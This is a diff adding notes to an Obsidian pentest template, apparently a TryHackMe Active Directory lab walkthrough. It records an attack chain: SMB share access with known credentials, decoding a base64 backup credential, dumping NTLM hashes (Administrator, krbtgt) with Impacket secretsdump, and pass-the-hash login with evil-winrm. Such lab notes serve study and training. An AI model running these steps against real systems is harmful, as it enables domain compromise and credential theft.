@@ -3,7 +3,7 @@ Use this template in Obsidian to register your findings per target.
 ---
 ## 🖥️ Target System: `IP/Hostname`
 
-IP - 10.10.130.140
+IP - 10.10.130.140 | 10.10.185.102
 
 <summary>1. 🧭 Initial Reconnaissance</summary>
 
@@ -78,6 +78,78 @@ got
 - **Screenshots/Proof**:
 
 ![[Pasted image 20250630160138.png]]
+
+Using smbclient:
+
+```
+smbclient -L //10.10.185.102 -U 'THM-AD/svc-admin%management2005'
+
+```
+
+![[Pasted image 20250707151309.png]]
+
+We can now enter the backup share
+
+```
+smbclient //10.10.185.102/backup -U 'THM-AD/svc-admin%management2005'
+```
+
+we can list what is in the backup and retrieve the data
+
+![[Pasted image 20250707151712.png]]
+
+in the file we have the following credentials
+
+```
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+```
+
+Using cyberchef we can decode the credential:
+
+```
+backup@spookysec.local:backup2517860
+```
+
+domain: spookysec.local
+user:  backup
+pass: backup2517860
+
+using Impacket secretsdump.py
+
+
+```
+secretsdump.py 'spookysec.local/backup:backup2517860@10.10.135.91'
+```
+
+
+### 🧱 Breaking it Down:
+
+| Part                                                  | Explanation                                                                   |
+| ----------------------------------------------------- | ----------------------------------------------------------------------------- |
+| `secretsdump.py`                                      | The tool being run (from Impacket)                                            |
+| `'spookysec.local/backup:backup2517860@10.10.135.91'` | The authentication and target string. Let's break this further:               |
+| `spookysec.local`                                     | The **domain name** (Active Directory domain)                                 |
+| `backup`                                              | The **username** you're using to authenticate                                 |
+| `backup2517860`                                       | The **password** for the `backup` user                                        |
+| `10.10.135.91`                                        | The **IP address** of the target system (most likely a **domain controller**) |
+we get the followin hashes:
+
+![[Pasted image 20250707153159.png]]
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+
+using evil-winrm
+
+```
+evil-winrm -i 10.10.185.102 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+```
+
+we have access to the adminstrator
+
+![[Pasted image 20250707155446.png]]
 
 ---
 
